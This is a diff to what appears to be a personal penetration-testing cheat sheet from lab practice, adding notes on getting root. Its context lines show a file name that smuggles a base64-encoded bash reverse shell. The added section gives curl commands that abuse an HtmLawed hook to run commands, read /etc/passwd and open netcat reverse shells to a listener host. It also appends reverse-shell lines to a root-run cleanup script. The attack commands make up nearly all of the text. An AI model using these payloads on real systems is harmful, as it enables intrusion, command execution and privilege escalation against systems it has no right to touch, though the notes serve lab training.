@@ -2746,6 +2746,20 @@ echo -ne test > en.png
 cp en.png '|en"`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjI0OC84MDgwIDA+JjE= | base64 -d | bash`".png' # make sure properly check single and double quotes endings
 # file name like '|en"`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjI0OC84MDgwIDA+JjE= | base64 -d | bash`".png'
 ```
+
+### Root access to the script user script and HtmLawed
+- I saw that some scripts has the root privileges to the scripts we can get root 2 way shown below
+- HtmLawed code execution with hook set to exec, Reference LAW-PGPractice Offsec
+```bash
+# In the web page settings change hook to exec then forward the request with burpsuite or below script
+curl -s -d 'sid=foo&hhook=exec&text=cat /etc/passwd' -b 'sid=foo' http://192.168.198.190/ |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/' # change URL accordingly 
+curl -s -d 'sid=foo&hhook=exec&text=nc 192.168.45.171 8088 -e /bin/sh' -b 'sid=foo' http://192.168.198.190/ |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'
+rlwrap nc -nlvp 8088 # otherwise change the ports
+# I saw that /var/www has cleanup.sh with also shown in linpeas.sh first trying ping
+echo 'id | nc 192.168.45.171 8082' >> cleanup.sh # rlwrap nc -nlvp 8082 got root
+echo 'nc 192.168.45.171 8083 -e /bin/bash' >> cleanup.sh  # everytime change port
+rlwrap nc -nlvp 8083 # Root user
+```
 ---
 # Post Exploitation
 
